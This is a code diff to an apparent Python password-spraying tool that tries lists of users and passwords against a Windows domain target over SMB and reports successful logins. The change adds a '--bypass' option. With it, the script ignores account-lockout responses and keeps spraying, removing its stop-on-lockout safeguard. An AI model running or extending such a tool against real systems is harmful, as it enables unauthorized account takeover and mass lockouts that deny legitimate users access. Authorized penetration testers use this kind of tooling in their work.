@@ -23,7 +23,7 @@ def write_output(user, password, output):
     file.close()
 
 
-def sprayer(domain, user_list, password_list, target_ip, output):
+def sprayer(domain, user_list, password_list, target_ip, output, bypass):
     # loop through each set of passwords, spraying each user
     print("Running")
     # remove the new line character from the users
@@ -66,10 +66,11 @@ def sprayer(domain, user_list, password_list, target_ip, output):
             elif answer == "session setup failed: NT_STATUS_ACCOUNT_LOCKED_OUT\n":
                 print(answer.replace("\n", "") + " using the account " + user + " and the password " + password)
                 user_diff = set(user_list_clean) - set(temp_users)
-                print('Stopping script due to account lockout')
-                print('The following accounts are expired, disabled or cracked:')
-                print(user_diff)
-                quit()
+                if bypass is not True:
+                    print('Stopping script due to account lockout')
+                    print('The following accounts are expired, disabled or cracked:')
+                    print(user_diff)
+                    quit()
             # if logon fails, drop the response, any other response, print to screen and remove account from spraying
             elif answer != "session setup failed: NT_STATUS_LOGON_FAILURE\n":
                 print("The account %s was successfully logged into using the password %s" % (user, password))
@@ -90,6 +91,7 @@ def main():
     parser.add_argument('-p', '--password', help='Use a single password')
     parser.add_argument('-t', '--target', help='Target IP address')
     parser.add_argument('-o', '--output', help='Output file name')
+    parser.add_argument('-b', '--bypass', action='store_true', help='Bypass locked accounts')
     args = parser.parse_args()
 
     # set list of users
@@ -124,8 +126,11 @@ def main():
     else:
         output = None
 
+    # bypass boolean
+    bypass = args.bypass
+
     # run the program
-    sprayer(domain, users, passwords, target, output)
+    sprayer(domain, users, passwords, target, output, bypass)
 
 
 main()
